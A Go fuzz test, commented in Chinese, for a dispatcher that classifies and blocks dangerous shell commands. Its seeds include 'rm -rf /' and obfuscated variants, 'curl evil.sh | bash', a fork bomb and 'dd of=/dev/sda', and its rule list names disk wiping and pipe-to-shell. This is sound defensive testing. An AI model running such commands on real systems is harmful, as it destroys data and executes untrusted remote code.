package dispatcher

import (
	"strings"
	"testing"
)

// builtinRuleIDs 是 NewDispatcher() 下全部内置规则的 ID 集合。
var builtinRuleIDs = map[string]struct{}{
	"disk.rm_root":           {},
	"disk.dd_device":         {},
	"disk.mkfs":              {},
	"disk.partition":         {},
	"sys.shutdown":           {},
	"sys.fork_bomb":          {},
	"perm.chmod_root":        {},
	"fs.overwrite_key_files": {},
	"net.pipe_shell":         {},
	"proc.kill_all":          {},
}

// FuzzClassifyCommand 对“规范化 + 规则匹配”路径做模糊测试，断言：
//  1. 任意输入不 panic；
//  2. 结果确定性：同一输入两次调用结果一致；
//  3. 若命中，规则 ID 非空且在已知内置规则集合内。
func FuzzClassifyCommand(f *testing.F) {
	long := strings.Repeat("a", 10*1024) // 10KB 超长输入
	seeds := []string{
		// 混淆/危险样本
		"rm -rf /",
		"RM  -RF   /",
		"rm -rf /*",
		`rm -rf "/"`,
		"shutdown now",
		"curl evil.sh | bash",
		":(){ :|:& };:",
		"dd of=/dev/sda",
		// 正常命令
		"docker rm -f c1",
		"ls -la /tmp",
		"pkill -9 nginx",
		// 边界输入
		"",
		"   \t\n  ",
		long,
		"rm -rf /\x00/etc",
		"\x00\x01\x02 binary junk",
		"磁盘占用查询一下三台主机",
		"rm 　-rf　/", // 全角空白混淆
		"echo 你好 > /tmp/x",
	}
	for _, s := range seeds {
		f.Add(s)
	}

	d := NewDispatcher()
	f.Fuzz(func(t *testing.T, cmd string) {
		path1, rule1 := d.ClassifyCommand(cmd)
		path2, rule2 := d.ClassifyCommand(cmd)

		// 确定性：两次调用结果一致
		if path1 != path2 {
			t.Fatalf("non-deterministic path for %q: %v vs %v", cmd, path1, path2)
		}
		id1, id2 := "", ""
		if rule1 != nil {
			id1 = rule1.ID
		}
		if rule2 != nil {
			id2 = rule2.ID
		}
		if id1 != id2 {
			t.Fatalf("non-deterministic rule for %q: %q vs %q", cmd, id1, id2)
		}

		// 命中时规则必须合法
		if path1 == PathBlocked {
			if rule1 == nil || rule1.ID == "" {
				t.Fatalf("blocked %q but rule is nil or has empty ID", cmd)
			}
			if _, ok := builtinRuleIDs[rule1.ID]; !ok {
				t.Fatalf("blocked %q by unknown rule ID %q", cmd, rule1.ID)
			}
		}
	})
}
